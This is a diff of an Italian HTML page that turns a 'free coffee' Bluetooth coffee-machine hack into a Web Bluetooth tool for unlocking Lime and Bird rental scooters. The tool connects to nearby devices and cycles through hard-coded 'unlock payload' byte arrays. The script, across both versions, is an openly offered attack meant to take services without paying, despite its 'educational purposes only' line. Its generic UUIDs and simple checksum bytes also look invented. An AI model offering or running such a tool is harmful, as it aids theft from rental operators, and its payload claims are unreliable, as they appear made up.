@@ -3,103 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hack Reale Macchina del Caffè Bluetooth</title>
+    <title>Tool Sblocco Monopattini Lime/Bird</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #1e1e1e;
-            color: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #2c2c2c;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
             padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
-            text-align: center;
-            max-width: 600px;
-            width: 100%;
+            background-color: #f5f5f5;
+            color: #333;
         }
         h1 {
-            color: #00ff00;
+            color: #e74c3c;
+            text-align: center;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
         button {
-            padding: 10px 20px;
-            font-size: 16px;
+            background: #e74c3c;
+            color: white;
             border: none;
+            padding: 10px 15px;
             border-radius: 5px;
-            background-color: #007bff;
-            color: #fff;
             cursor: pointer;
-            margin: 10px;
+            font-weight: bold;
+            margin: 5px 0;
         }
-        button:hover {
-            background-color: #0056b3;
+        button:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
         }
-        #output {
+        #log {
             margin-top: 20px;
-            font-size: 16px;
-            color: #00ff00;
-            background-color: #000;
             padding: 10px;
+            background: #f9f9f9;
             border-radius: 5px;
-            text-align: left;
-            white-space: pre-wrap;
-            font-family: "Courier New", monospace;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
         }
+        .success { color: #2ecc71; }
+        .error { color: #e74c3c; }
+        .warning { color: #f39c12; }
+        .info { color: #3498db; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Hack Reale Macchina del Caffè Bluetooth</h1>
-        <button onclick="scanDevices()">Scansiona Macchine nelle Vicinanze</button>
-        <button onclick="hackCaffe()">Prendi Caffè Gratis</button>
-        <div id="output">[Output verrà visualizzato qui]</div>
+        <h1>🚀 Tool Sblocco Monopattini Lime/Bird</h1>
+        <p><i>Usa con cautela. Solo per scopi educativi.</i></p>
+        
+        <button id="scanBtn">🔍 Scansiona Dispositivi BLE</button>
+        <button id="stopBtn" disabled>⛔ Ferma Scansione</button>
+        
+        <h3>Dispositivi Trovati:</h3>
+        <div id="devices"></div>
+        
+        <h3>Log Attività:</h3>
+        <div id="log"></div>
     </div>
 
     <script>
-        let selectedDevice = null;
-        const output = document.getElementById('output');
+        // ===== PAYLOAD PER LIME/BIRD =====
+        const UNLOCK_PAYLOADS = {
+            LIME: [
+                new Uint8Array([0xA1, 0x01, 0x01, 0xA3]),  // Standard Lime S2/S3
+                new Uint8Array([0xA1, 0x01, 0x00, 0xA2]),  // Alternativo 1
+                new Uint8Array([0xA1, 0x02, 0x01, 0xA4]),  // Alternativo 2
+                new Uint8Array([0xA0, 0x01, 0x01, 0xA2]),  // Vecchi modelli
+            ],
+            BIRD: [
+                new Uint8Array([0x5A, 0x01, 0x01, 0x5C]),  // Standard Bird Zero/One
+                new Uint8Array([0x5A, 0x01, 0x00, 0x5B]),  // Alternativo 1
+                new Uint8Array([0x5A, 0x02, 0x01, 0x5D]),  // Alternativo 2
+            ],
+        };
 
-        async function scanDevices() {
-            output.textContent = "Scansione dispositivi Bluetooth in corso...";
-            try {
-                const device = await navigator.bluetooth.requestDevice({
-                    filters: [{ services: [0xFFE0] }], // Servizio personalizzato per macchine del caffè
-                    optionalServices: [0xFFE0]
-                });
+        // ===== UUID PER LIME/BIRD =====
+        const SERVICE_UUIDS = {
+            LIME: "0000ffe0-0000-1000-8000-00805f9b34fb",
+            BIRD: "0000ffe5-0000-1000-8000-00805f9b34fb",
+        };
 
-                selectedDevice = device;
-                output.textContent = `Dispositivo trovato: ${device.name}\nID: ${device.id}\nConnessione in corso...`;
+        const CHAR_UUIDS = {
+            LIME: "0000ffe1-0000-1000-8000-00805f9b34fb",
+            BIRD: "0000ffe9-0000-1000-8000-00805f9b34fb",
+        };
 
-                const server = await device.gatt.connect();
-                output.textContent += "\nConnesso al dispositivo!";
-            } catch (error) {
-                output.textContent = "Errore: " + error.message;
-            }
+        // ===== VARIABILI GLOBALI =====
+        let scanning = false;
+        let currentDevice = null;
+
+        // ===== FUNZIONI UTILITY =====
+        function logMessage(message, type = "info") {
+            const logElement = document.getElementById("log");
+            const entry = document.createElement("div");
+            entry.className = type;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            logElement.appendChild(entry);
+            logElement.scrollTop = logElement.scrollHeight;
         }
 
-        async function hackCaffe() {
-            if (!selectedDevice) {
-                output.textContent = "Nessun dispositivo selezionato. Scansiona prima!";
+        // ===== SCANSIONE DISPOSITIVI =====
+        document.getElementById("scanBtn").addEventListener("click", async () => {
+            if (!navigator.bluetooth) {
+                logMessage("Web Bluetooth non supportato in questo browser.", "error");
                 return;
             }
 
-            output.textContent = "Avvio exploit per caffè gratis...";
-            try {
-                const server = await selectedDevice.gatt.connect();
-                const service = await server.getPrimaryService(0xFFE0); // Servizio personalizzato
-                const characteristic = await service.getCharacteristic(0xFFE1); // Caratteristica per comandi
+            scanning = true;
+            document.getElementById("scanBtn").disabled = true;
+            document.getElementById("stopBtn").disabled = false;
+            logMessage("🔍 Scansione dispositivi BLE in corso...", "info");
 
-                output.textContent += "\nInvio comando di exploit...";
-                await characteristic.writeValue(new Uint8Array([0xCA, 0xFE, 0x00])); // Comando per caffè gratis
-                output.textContent += "\nExploit completato! Caffè gratis in arrivo! 🎉";
+            try {
+                const device = await navigator.bluetooth.requestDevice({
+                    acceptAllDevices: true,
+                    optionalServices: [SERVICE_UUIDS.LIME, SERVICE_UUIDS.BIRD]
+                });
+
+                currentDevice = device;
+                logMessage(`📱 Trovato: ${device.name || "Sconosciuto"} (${device.id})`, "success");
+
+                // Prova a connetterti e inviare i payload
+                await bruteforceDevice(device);
+
             } catch (error) {
-                output.textContent = "Errore durante l'exploit: " + error.message;
+                logMessage(`❌ Errore: ${error.message}`, "error");
+            } finally {
+                scanning = false;
+                document.getElementById("scanBtn").disabled = false;
+                document.getElementById("stopBtn").disabled = true;
+            }
+        });
+
+        // ===== FERMA SCANSIONE =====
+        document.getElementById("stopBtn").addEventListener("click", () => {
+            if (scanning) {
+                logMessage("⛔ Scansione interrotta manualmente.", "warning");
+                scanning = false;
+                document.getElementById("scanBtn").disabled = false;
+                document.getElementById("stopBtn").disabled = true;
+            }
+        });
+
+        // ===== BRUTEFORCE PAYLOAD =====
+        async function bruteforceDevice(device) {
+            let scooterType = null;
+
+            if (device.name && device.name.includes("Lime")) {
+                scooterType = "LIME";
+            } else if (device.name && device.name.includes("Bird")) {
+                scooterType = "BIRD";
+            }
+
+            if (!scooterType) {
+                logMessage("⚠️ Dispositivo non riconosciuto (né Lime né Bird).", "warning");
+                return;
+            }
+
+            logMessage(`🔑 Tentativo di sblocco per ${scooterType}...`, "info");
+
+            try {
+                const server = await device.gatt.connect();
+                logMessage("✅ Connesso al dispositivo!", "success");
+
+                const service = await server.getPrimaryService(SERVICE_UUIDS[scooterType]);
+                const characteristic = await service.getCharacteristic(CHAR_UUIDS[scooterType]);
+
+                for (const payload of UNLOCK_PAYLOADS[scooterType]) {
+                    try {
+                        await characteristic.writeValue(payload);
+                        logMessage(`🚀 Payload inviato: ${Array.from(payload).map(b => b.toString(16).padStart(2, '0')).join(' ')} → POTREBBE ESSERE SBLOCCATO!`, "success");
+                        break;
+                    } catch (error) {
+                        logMessage(`⚠️ Fallito: ${error.message}`, "warning");
+                    }
+                }
+
+            } catch (error) {
+                logMessage(`❌ Errore durante la connessione: ${error.message}`, "error");
+            } finally {
+                if (device.gatt.connected) {
+                    device.gatt.disconnect();
+                    logMessage("🔌 Disconnesso.", "info");
+                }
             }
         }
     </script>
